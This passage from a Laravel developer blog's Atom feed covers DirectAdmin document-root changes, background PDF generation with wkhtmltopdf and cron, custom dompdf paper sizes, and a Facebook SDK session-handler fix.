    <published>2016-02-23T19:46:03.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>For those of you developing <a href="https://laravel.com/">Laravel</a> application, sure you have face this issue if you’re hosted in DirectAdmin hosting.</p><p>Besides, if you want to setup auto deployment like <a href="http://rocketeer.autopergamene.eu/#/docs/rocketeer/README">Rocketeer</a>, also you will need to change the document root.</p><p>Let’s take an example in my scenario, Laravel + Rocketeer auto deployment</p><h2 id="1-Login-to-your-DirectAdmin-and-go-to-“Custom-HTTPD-Configurations”"><a href="#1-Login-to-your-DirectAdmin-and-go-to-“Custom-HTTPD-Configurations”" class="headerlink" title="1. Login to your DirectAdmin, and go to “Custom HTTPD Configurations”"></a>1. Login to your DirectAdmin, and go to “Custom HTTPD Configurations”</h2><p><img src="/images/posts/2016-02-24-change-document-root-in-directadmin/direct-admin-home.png" alt="DirectAdmin home page"></p><h2 id="2-Choose-the-site-that-you-want-to-edit"><a href="#2-Choose-the-site-that-you-want-to-edit" class="headerlink" title="2. Choose the site that you want to edit"></a>2. Choose the site that you want to edit</h2><p><img src="/images/posts/2016-02-24-change-document-root-in-directadmin/select-domain.png" alt="DirectAdmin select domain"></p><h2 id="3-Update-the-vhost-config"><a href="#3-Update-the-vhost-config" class="headerlink" title="3. Update the vhost config"></a>3. Update the vhost config</h2><p><img src="/images/posts/2016-02-24-change-document-root-in-directadmin/change-docroot.png" alt="DirectAdmin change virtual host"></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|*<span class="keyword">if</span> !SUB|</span><br><span class="line">ServerAlias *.|DOMAIN|</span><br><span class="line">|?DOCROOT=<span class="regexp">/home/</span>admin<span class="regexp">/domains/y</span>ourdomain.com<span class="regexp">/public_html/y</span>ourdomain.com<span class="regexp">/current/</span><span class="keyword">public</span>|</span><br><span class="line">|*endif|</span><br></pre></td></tr></table></figure><p>As I mention just now, using Rocketeer in this case, thus it will point to <strong>current</strong> directory <em>(softlink)</em>, and <strong>public</strong> is because of laravel project.</p><h2 id="4-Restart-web-server"><a href="#4-Restart-web-server" class="headerlink" title="4. Restart web server"></a>4. Restart web server</h2><p>Login with <strong>root</strong> user, then restart</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ service httpd restart</span><br></pre></td></tr></table></figure><p>Now it should works.</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;For those of you developing &lt;a href=&quot;https://laravel.com/&quot;&gt;Laravel&lt;/a&gt; application, sure you have face this issue if you’re hosted in</summary>
        
      
    
    
    
    
    <category term="apache" scheme="http://jslim.net/tags/apache/"/>
    
    <category term="DirectAdmin" scheme="http://jslim.net/tags/DirectAdmin/"/>
    
  </entry>
  
  <entry>
    <title>PHP Laravel 5 generate long PDF file in running in background</title>
    <link href="http://jslim.net/blog/2016/02/04/php-laravel-5-generate-long-pdf-file-in-running-in-background/"/>
    <id>http://jslim.net/blog/2016/02/04/php-laravel-5-generate-long-pdf-file-in-running-in-background/</id>
    <published>2016-02-04T19:44:45.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>If you have come across a problem with generating a large PDF file in your Laravel application, probably is not a good idea for the user to wait.</p><p>One of the solution is to process the PDF generation in background.</p><h2 id="Pre-requisite"><a href="#Pre-requisite" class="headerlink" title="Pre-requisite"></a>Pre-requisite</h2><ul><li><a href="http://wkhtmltopdf.org/">wkhtmltopdf</a></li><li>cronjob</li></ul><h2 id="1-Create-a-table-for-cronjob-task"><a href="#1-Create-a-table-for-cronjob-task" class="headerlink" title="1. Create a table for cronjob task"></a>1. Create a table for cronjob task</h2><p>Let’s name it <code>cronjob</code> table</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title class_">Schema</span>::<span class="title function_ invoke__">create</span>(<span class="string">&#x27;cronjob&#x27;</span>, function(<span class="variable">$table</span>) &#123;</span><br><span class="line">    <span class="variable">$table</span>-&gt;<span class="title function_ invoke__">increments</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line">    <span class="variable">$table</span>-&gt;<span class="keyword">string</span>(<span class="string">&#x27;type&#x27;</span>, <span class="number">40</span>);</span><br><span class="line">    <span class="variable">$table</span>-&gt;<span class="title function_ invoke__">text</span>(<span class="string">&#x27;data&#x27;</span>)-&gt;<span class="title function_ invoke__">nullable</span>();</span><br><span class="line">    <span class="variable">$table</span>-&gt;<span class="keyword">integer</span>(<span class="string">&#x27;user_id&#x27;</span>)-&gt;<span class="title function_ invoke__">unsigned</span>()-&gt;<span class="keyword">default</span>(<span class="number">0</span>); <span class="comment">// user who created the cron</span></span><br><span class="line">    <span class="variable">$table</span>-&gt;<span class="title function_ invoke__">datetime</span>(<span class="string">&#x27;executed_at&#x27;</span>)-&gt;<span class="title function_ invoke__">nullable</span>(); <span class="comment">// the execution start time</span></span><br><span class="line">    <span class="variable">$table</span>-&gt;<span class="title function_ invoke__">datetime</span>(<span class="string">&#x27;completed_at&#x27;</span>)-&gt;<span class="title function_ invoke__">nullable</span>(); <span class="comment">// the complete timestamp</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Don’t forget also create a model class, <strong>Cronjob.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">SoftDeletes</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cronjob</span> <span class="keyword">extends</span> <span class="title">BaseModel</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">use</span> <span class="title">SoftDeletes</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$table</span> = <span class="string">&#x27;cronjob&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">belongsTo</span>(<span class="string">&#x27;App\Models\User&#x27;</span>, <span class="string">&#x27;user_id&#x27;</span>, <span class="string">&#x27;id&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>P/S: In my case, I put all models into <strong>app/Models/</strong> directory, it depends on where you keep them</em></p><h2 id="2-Download-wkhtmltopdf"><a href="#2-Download-wkhtmltopdf" class="headerlink" title="2. Download wkhtmltopdf"></a>2. Download wkhtmltopdf</h2><p>Download it here <a href="http://wkhtmltopdf.org/downloads.html">http://wkhtmltopdf.org/downloads.html</a></p><p>Extract the tarball, only copy the binary to your project</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir <span class="regexp">/path/</span>to<span class="regexp">/project/</span>bin <span class="comment"># create a folder to keep the binary</span></span><br><span class="line">$ mv <span class="regexp">/path/</span>to<span class="regexp">/wkhtmltox/</span>bin<span class="regexp">/wkhtmltopdf /</span>path<span class="regexp">/to/</span>project<span class="regexp">/bin/</span>wkhtmltopdf</span><br></pre></td></tr></table></figure><h2 id="3-Create-a-cronjob"><a href="#3-Create-a-cronjob" class="headerlink" title="3. Create a cronjob"></a>3. Create a cronjob</h2><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>crontab -e</span><br></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * <span class="regexp">/usr/</span>bin<span class="regexp">/php /</span>path<span class="regexp">/to/</span><span class="keyword">project</span><span class="regexp">/artisan schedule:run &gt;&gt; /</span>dev/<span class="keyword">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure><p>Bare in mind that Laravel has it’s own <a href="https://laravel.com/docs/master/scheduling">scheduler</a>.</p><p>Now create a file in <strong>/path/to/project/app/Console/Command/GeneratePDF.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Console</span>\<span class="title class_">Commands</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Console</span>\<span class="title">Command</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">Cronjob</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GeneratePDF</span> <span class="keyword">extends</span> <span class="title">Command</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The name and signature of the console command.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$signature</span> = <span class="string">&#x27;generate_pdf&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The console command description.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$description</span> = <span class="string">&#x27;Generate pdf from html&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute the console command.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// get all cron that not yet complete</span></span><br><span class="line">        <span class="variable">$jobs</span> = <span class="title class_">Cronjob</span>::<span class="title function_ invoke__">where</span>(<span class="string">&#x27;type&#x27;</span>, <span class="variable">$this</span>-&gt;signature)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">whereNull</span>(<span class="string">&#x27;completed_at&#x27;</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">get</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$jobs</span> <span class="keyword">as</span> <span class="variable">$job</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$job</span>-&gt;executed_at = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">            <span class="variable">$job</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_generatePdf</span>(<span class="variable">$job</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// mark it as completed</span></span><br><span class="line">            <span class="variable">$job</span>-&gt;completed_at = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">            <span class="variable">$job</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_generatePdf</span>(<span class="params">Cronjob <span class="variable">$job</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$job</span>-&gt;data, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$path</span> = <span class="title function_ invoke__">storage_path</span>(<span class="string">&#x27;files/users/&#x27;</span> . <span class="variable">$job</span>-&gt;user_id . <span class="string">&#x27;/pdf&#x27;</span>);</span><br><span class="line">        @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$path</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$html_file</span> = <span class="title function_ invoke__">storage_path</span>(<span class="string">&#x27;files/users/&#x27;</span> . <span class="variable">$job</span>-&gt;user_id . <span class="string">&#x27;/html/&#x27;</span> . <span class="variable">$data</span>[<span class="string">&#x27;html&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file</span> = <span class="string">&#x27;your-awesome-pdf-file.pdf&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$cmd_output</span> = <span class="title function_ invoke__">exec</span>(<span class="title function_ invoke__">base_path</span>(<span class="string">&#x27;bin/wkhtmltopdf&#x27;</span>) . <span class="string">&#x27; &#x27;</span> . <span class="variable">$html_file</span> . <span class="string">&#x27; &#x27;</span> . <span class="variable">$path</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$html_file</span>); <span class="comment">// remove temporary html file</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Also, don’t forget to add it to <strong>/path/to/project/app/Console/Kernel.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$commands</span> = [</span><br><span class="line">    ...</span><br><span class="line">    \App\Console\Commands\GeneratePDF::<span class="variable language_">class</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">schedule</span>(<span class="params">Schedule <span class="variable">$schedule</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="variable">$schedule</span>-&gt;<span class="title function_ invoke__">command</span>(<span class="string">&#x27;generate_pdf&#x27;</span>)</span><br><span class="line">        -&gt;<span class="title function_ invoke__">everyMinute</span>()</span><br><span class="line">        -&gt;<span class="title function_ invoke__">withoutOverlapping</span>()</span><br><span class="line">        -&gt;<span class="title function_ invoke__">sendOutputTo</span>(<span class="title function_ invoke__">storage_path</span>(<span class="string">&#x27;logs/generate_pdf.log&#x27;</span>))</span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Now it will run this every minute.</p><h2 id="4-In-your-controller"><a href="#4-In-your-controller" class="headerlink" title="4. In your controller"></a>4. In your controller</h2><p>Now let’s do the code in your controller</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generatePDF</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="variable">$html</span> = <span class="title function_ invoke__">view</span>(<span class="string">&#x27;module.awesome.pdf&#x27;</span>, [</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$data</span>,</span><br><span class="line">    ])-&gt;<span class="title function_ invoke__">render</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">storage_path</span>(<span class="string">&#x27;files/users/&#x27;</span> . <span class="title class_">\Auth</span>::<span class="title function_ invoke__">user</span>()-&gt;id . <span class="string">&#x27;/html&#x27;</span>);</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$path</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;awesome-html-file.html&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$filename</span>, <span class="variable">$html</span>); <span class="comment">// save to a temporary html file</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// schedule generate pdf in cronjob</span></span><br><span class="line">    <span class="variable">$cronjob</span> = <span class="keyword">new</span> <span class="title class_">Cronjob</span>();</span><br><span class="line">    <span class="variable">$cronjob</span>-&gt;type = <span class="string">&#x27;generate_pdf&#x27;</span>;</span><br><span class="line">    <span class="variable">$cronjob</span>-&gt;data = <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;html&#x27;</span> =&gt; <span class="variable">$filename</span>,</span><br><span class="line">    ]);</span><br><span class="line">    <span class="variable">$cronjob</span>-&gt;user_id = <span class="title class_">\Auth</span>::<span class="title function_ invoke__">user</span>()-&gt;id; <span class="comment">// keep the current user identity, because in cron, it won&#x27;t know which user is current user</span></span><br><span class="line">    <span class="variable">$cronjob</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>()-&gt;<span class="title function_ invoke__">back</span>()</span><br><span class="line">        -&gt;<span class="title function_ invoke__">with</span>(<span class="string">&#x27;alert.success&#x27;</span>, <span class="string">&#x27;PDF is currently processing in background. Please refresh the page later.&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DONE :)</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;If you have come across a problem with generating a large PDF file in your Laravel application, probably is not a good idea for the user</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="laravel" scheme="http://jslim.net/tags/laravel/"/>
    
    <category term="cronjob" scheme="http://jslim.net/tags/cronjob/"/>
    
  </entry>
  
  <entry>
    <title>Laravel-dompdf set custom paper size</title>
    <link href="http://jslim.net/blog/2015/12/28/laravel-dompdf-set-custom-paper-size/"/>
    <id>http://jslim.net/blog/2015/12/28/laravel-dompdf-set-custom-paper-size/</id>
    <published>2015-12-28T00:56:10.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>Often, many web application required functions like <em>export to pdf</em>, but not all the time is <a href="http://www.papersizes.org/a-paper-sizes.htm">A4 paper size</a>.</p><p>I’m using <a href="https://github.com/barryvdh/laravel-dompdf">laravel-dompdf</a> for the project. I will not talk about the setup. Let’s see the code directly.</p><p><strong>PdfController.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;download-file-name.pdf&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pdf</span> = \PDF::<span class="title function_ invoke__">loadView</span>(<span class="string">&#x27;download.pdf&#x27;</span>, [<span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$some_data</span>])</span><br><span class="line">    -&gt;<span class="title function_ invoke__">setPaper</span>(<span class="string">&#x27;a4&#x27;</span>, <span class="string">&#x27;landscape&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$pdf</span>-&gt;<span class="title function_ invoke__">download</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><p>The code above, will generate &amp; download the pdf file in A4 paper size. But what if different paper size is needed?</p><p>You can set the paper size to any size you want</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pdf</span>-&gt;<span class="title function_ invoke__">setPaper</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">685.98</span>, <span class="number">396.85</span>], <span class="string">&#x27;landscape&#x27;</span>);</span><br></pre></td></tr></table></figure><p><em>(Bare in mind that the value is in point unit)</em></p><p>You can measure the paper with your ruler.</p><p><img src="/images/posts/2015-12-28-laravel-dompdf-set-custom-paper-size/measure-paper.jpg" alt="Measure paper size"></p><p>But what you measure is in centimeter <em>(cm)</em> or millimeter <em>(mm)</em>, so you can ask google to convert the unit for you</p><p><img src="/images/posts/2015-12-28-laravel-dompdf-set-custom-paper-size/google-converter.png" alt="Google converter"></p><p>Done.</p><p>References:</p><ul><li><a href="https://code.google.com/p/dompdf/wiki/Usage">dompdf - usage</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Often, many web application required functions like &lt;em&gt;export to pdf&lt;/em&gt;, but not all the time is &lt;a</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="laravel" scheme="http://jslim.net/tags/laravel/"/>
    
  </entry>
  
  <entry>
    <title>Laravel 5 with Facebook error - Cross-site request forgery validation failed. Required param &quot;state&quot; missing</title>
    <link href="http://jslim.net/blog/2015/12/01/laravel-5-with-facebook-error-cross-site-request-forgery-validation-failed-required-param-state-missing/"/>
    <id>http://jslim.net/blog/2015/12/01/laravel-5-with-facebook-error-cross-site-request-forgery-validation-failed-required-param-state-missing/</id>
    <published>2015-12-01T04:41:10.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>The reason of this error is due to Laravel doesn’t use native PHP session store.</p><h2 id="1-Create-a-custom-session-handler-class"><a href="#1-Create-a-custom-session-handler-class" class="headerlink" title="1. Create a custom session handler class"></a>1. Create a custom session handler class</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir <span class="regexp">/path/</span>to<span class="regexp">/project/</span>app<span class="regexp">/Libraries/</span>Facebook</span><br><span class="line">$ vim <span class="regexp">/path/</span>to<span class="regexp">/project/</span>app<span class="regexp">/Libraries/</span>Facebook/FacebookPersistentDataHandler.php</span><br></pre></td></tr></table></figure><p>paste the following content</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Libraries</span>\<span class="title class_">Facebook</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FacebookPersistentDataHandler</span> <span class="keyword">implements</span> \<span class="title">Facebook</span>\<span class="title">PersistentData</span>\<span class="title">PersistentDataInterface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">\Session</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;facebook.&#x27;</span> . <span class="variable">$key</span>);</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">      <span class="title class_">\Session</span>::<span class="title function_ invoke__">put</span>(<span class="string">&#x27;facebook.&#x27;</span> . <span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-Pass-in-to-Facebook-instance"><a href="#2-Pass-in-to-Facebook-instance" class="headerlink" title="2. Pass in to Facebook instance"></a>2. Pass in to Facebook instance</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$facebook</span> = <span class="keyword">new</span> <span class="title class_">\Facebook\Facebook</span>([</span><br><span class="line">    <span class="string">&#x27;app_id&#x27;</span> =&gt; <span class="title function_ invoke__">config</span>(<span class="string">&#x27;facebook.app_id&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;app_secret&#x27;</span> =&gt; <span class="title function_ invoke__">config</span>(<span class="string">&#x27;facebook.app_secret&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;persistent_data_handler&#x27;</span> =&gt; <span class="keyword">new</span> <span class="title class_">\App\Libraries\Facebook\FacebookPersistentDataHandler</span>()</span><br><span class="line">]);</span><br></pre></td></tr></table></figure><p>This should solve the issue</p><p>References:</p><ul><li><a href="https://github.com/facebook/facebook-php-sdk-v4/issues/292">GitHub: validateCsrf produces Error</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;The reason of this error is due to Laravel doesn’t use native PHP session store.&lt;/p&gt;
&lt;h2 id=&quot;1-Create-a-custom-session-handler-class&quot;&gt;&lt;a</summary>
        
      
    
    
    
    
    <category term="laravel" scheme="http://jslim.net/tags/laravel/"/>
    
    <category term="facebook-php-sdk" scheme="http://jslim.net/tags/facebook-php-sdk/"/>
    
  </entry>
  
  <entry>
    <title>Setup wildcard subdomain in Laravel Homestead</title>
    <link href="http://jslim.net/blog/2015/12/01/setup-wildcard-subdomain-in-laravel-homestead/"/>
    <id>http://jslim.net/blog/2015/12/01/setup-wildcard-subdomain-in-laravel-homestead/</id>
    <published>2015-12-01T04:36:50.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
